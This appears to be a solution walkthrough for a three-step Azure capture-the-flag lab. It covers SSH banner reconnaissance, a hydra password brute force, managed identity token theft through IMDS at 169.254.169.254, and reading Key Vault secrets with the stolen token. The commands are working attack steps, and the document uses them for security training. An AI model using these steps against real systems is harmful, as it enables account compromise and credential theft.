# Solution Walkthrough: NET-MGMT-EXPOSED → CMP-IMDS → STR-KEYVAULT-POLICY

> **Seed:** `42`
> **Chain:** `NET-MGMT-EXPOSED → CMP-IMDS → STR-KEYVAULT-POLICY`
>
> This walkthrough uses a scenario generated with `--seed 42`. The chain
> order, usernames, passwords, and resource names are deterministic for this
> seed.

---

## Prerequisites

Deploy the scenario:

```bash
uv run saboteur deploy --seed 42 --chain-length 3
```

After deployment, you receive the Kali box connection info:

```
xfreerdp /v:<kali_ip> /u:kali /p:'<kali_pw>' /cert:ignore
```

RDP into the Kali box. Read `~/Desktop/README.txt` for orientation.

---

## Step 1: NET-MGMT-EXPOSED — Exposed Management Port

**Objective:** Discover and brute-force SSH credentials on an exposed VM.

### 1.1 Scan the target subnet

From the Kali box, scan the lab subnet for live hosts and open services:

```bash
nmap -sV 10.13.37.16/28
```

You will find a VM with **port 22 (SSH) open**. The `nmap` output includes
an SSH banner that leaks the service account username:

```
************************************************************
  CONTOSO LABS - Deployment Gateway
  Authorized access only. All sessions are monitored.

  System account : backup_user
  Support contact: backup_user@contoso-labs.com
  Managed by     : ops-team@contoso-labs.com
************************************************************
```

**Discovered:** username `backup_user`.

### 1.2 Brute-force the SSH password

Use hydra with the NCSC 100k password list (pre-installed via SecLists):

```bash
hydra -l backup_user \
  -P /usr/share/seclists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt \
  ssh://<target_ip>
```

Hydra finds the password within seconds:

```
[22][ssh] host: <target_ip>   login: backup_user   password: p@ssw0rd
```

### 1.3 SSH in and capture Flag 1

```bash
ssh backup_user@<target_ip>
```

```bash
cat /opt/azsaboteur/flag.txt
```

```
AZS_F{xxxxxxxxxxxx}
```

**Validate:**

```bash
saboteur validate 'AZS_F{xxxxxxxxxxxx}'
# ✓ Correct! Step 1/3 completed.
```

### 1.4 Collect breadcrumbs for the next step

Explore the compromised VM for hints:

```bash
cat /opt/azsaboteur/notes.txt
```

The notes mention a service principal with Contributor access and hint at
Key Vault and storage resources.

```bash
cat ~/.bash_history
```

The bash history reveals commands for querying IMDS, listing Key Vaults,
and running commands on other VMs — all hints for the next steps.

```bash
cat ~/.cloud-credentials
```

Contains planted (fake) Azure SP credentials. The `AZURE_CLIENT_SECRET`
field contains the flag value as a breadcrumb.

---

## Step 2: CMP-IMDS — Managed Identity Token via IMDS

**Objective:** Find a second VM with a managed identity and steal its OAuth
token via the Azure Instance Metadata Service (IMDS).

### 2.1 Discover the second VM

From the compromised VM, scan the lab subnet for other hosts:

```bash
nmap -sn 10.13.37.16/28
```

You will find a second VM on the same subnet. SSH into it using credentials
discovered through pivoting techniques or network enumeration.

### 2.2 Capture Flag 2

```bash
cat /opt/azsaboteur/flag.txt
```

```
AZS_F{xxxxxxxxxxxx}
```

**Validate:**

```bash
saboteur validate 'AZS_F{xxxxxxxxxxxx}'
# ✓ Correct! Step 2/3 completed.
```

### 2.3 Read the deployment notes

```bash
cat /opt/azsaboteur/notes.txt
```

The notes reveal that this VM has a **managed identity** assigned by
Terraform with permissions on resources in the resource group, and provide
the exact IMDS endpoints to query.

### 2.4 Query IMDS for instance metadata

```bash
curl -s -H "Metadata:true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
  | python3 -m json.tool
```

This confirms the VM is running in Azure and reveals the subscription ID,
resource group name, and VM details.

### 2.5 Steal the managed identity token

```bash
curl -s -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  | python3 -m json.tool
```

Save the `access_token` from the response. This is a Bearer token for Azure
Resource Manager, belonging to a managed identity with **Reader** access on
the resource group.

```bash
export ARM_TOKEN="<access_token_value>"
```

---

## Step 3: STR-KEYVAULT-POLICY — Lax Key Vault Access Policy

**Objective:** Use the stolen managed identity token to enumerate Azure
resources, discover a misconfigured Key Vault, and retrieve the final flag
from its secrets.

### 3.1 Enumerate resources in the resource group

Use the stolen ARM token to list resources. You can find the subscription ID
and resource group name from the IMDS instance metadata (step 2.4):

```bash
curl -s -H "Authorization: Bearer $ARM_TOKEN" \
  "https://management.azure.com/subscriptions/<subscription_id>/resourceGroups/rg-AZSaboteur-e6088011/resources?api-version=2021-04-01" \
  | python3 -m json.tool
```

In the output, look for a resource of type
`Microsoft.KeyVault/vaults` — you will find a Key Vault named
`kv-azs-strkeyva-79a5ac`.

### 3.2 Get a Key Vault-scoped token

The ARM token targets `https://management.azure.com/`. To read Key Vault
secrets, you need a token scoped to `https://vault.azure.net`:

```bash
curl -s -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" \
  | python3 -m json.tool
```

```bash
export KV_TOKEN="<vault_scoped_access_token>"
```

### 3.3 List secrets in the Key Vault

The lax access policy grants **Get** and **List** permissions to the stolen
managed identity:

```bash
curl -s -H "Authorization: Bearer $KV_TOKEN" \
  "https://kv-azs-strkeyva-79a5ac.vault.azure.net/secrets?api-version=7.4" \
  | python3 -m json.tool
```

You will see three secrets:

| Secret Name                | Purpose |
|----------------------------|---------|
| `DatabaseConnectionString` | **The flag** |
| `AppInsightsKey`           | Decoy |
| `StorageAccountKey`        | Decoy |

### 3.4 Read the flag secret

```bash
curl -s -H "Authorization: Bearer $KV_TOKEN" \
  "https://kv-azs-strkeyva-79a5ac.vault.azure.net/secrets/DatabaseConnectionString?api-version=7.4" \
  | python3 -m json.tool
```

The `value` field contains the final flag:

```
AZS_F{xxxxxxxxxxxx}
```

**Validate:**

```bash
saboteur validate 'AZS_F{xxxxxxxxxxxx}'
# ✓ Correct! Final flag — all 3 steps completed!
```

---

## Summary

| Step | Module | Technique | Flag |
|------|--------|-----------|------|
| 1 | NET-MGMT-EXPOSED | SSH banner recon → hydra brute-force | `AZS_F{xxxxxxxxxxxx}` |
| 2 | CMP-IMDS | IMDS token theft at `169.254.169.254` | `AZS_F{xxxxxxxxxxxx}` |
| 3 | STR-KEYVAULT-POLICY | Key Vault secret read with stolen token | `AZS_F{xxxxxxxxxxxx}` |

---

## Teardown

```bash
saboteur destroy AZSaboteur-e6088011
```
